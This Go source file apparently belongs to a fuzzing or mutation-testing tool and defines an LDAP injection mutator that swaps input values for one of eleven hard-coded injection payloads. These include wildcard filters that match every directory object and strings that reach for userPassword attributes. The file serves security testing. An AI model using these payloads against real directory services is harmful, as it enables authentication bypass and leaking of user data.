package mutation

import (
	"math/rand"
	"reflect"
)

var ldapInjectionPayloads = []string{
	"*)(&",
	"*))%00",
	")(cn=))\x00",
	"*()|%26'",
	"*()|&'",
	"*(|(mail=*))",
	"*(|(objectclass=*))",
	"*)(uid=*))(|(uid=*",
	"admin*)((|userpassword=*)",
	"admin*)((|userPassword=*)",
	"x' or name()='username' or 'x'='y",
}

// LDAPInjection replaces a value with a random LDAP injection payload.
// For more information on LDAP injection: https://owasp.org/www-community/attacks/LDAP_Injection
// Example: Hello -> *(|(objectclass=*))
type LDAPInjection struct{}

// ID returns mutator's 3-digit ID.
func (m *LDAPInjection) ID() string {
	return "014"
}

// Name returns the mutator's name.
func (m *LDAPInjection) Name() string {
	return "LDAP Injection"
}

// Description returns the mutator's description.
func (m *LDAPInjection) Description() string {
	return "Replace value with random LDAP injection payload"
}

// CompatibleKinds returns the data types that the mutator can mutate.
func (m *LDAPInjection) CompatibleKinds() []reflect.Kind {
	return []reflect.Kind{reflect.String, reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64, reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Float32, reflect.Float64, reflect.Invalid}
}

// Mutate returns a random LDAP injection payload.
// Example: *(|(objectclass=*))
func (m *LDAPInjection) Mutate(subject reflect.Value, r *rand.Rand) interface{} {
	return ldapInjectionPayloads[r.Intn(len(ldapInjectionPayloads))]
}
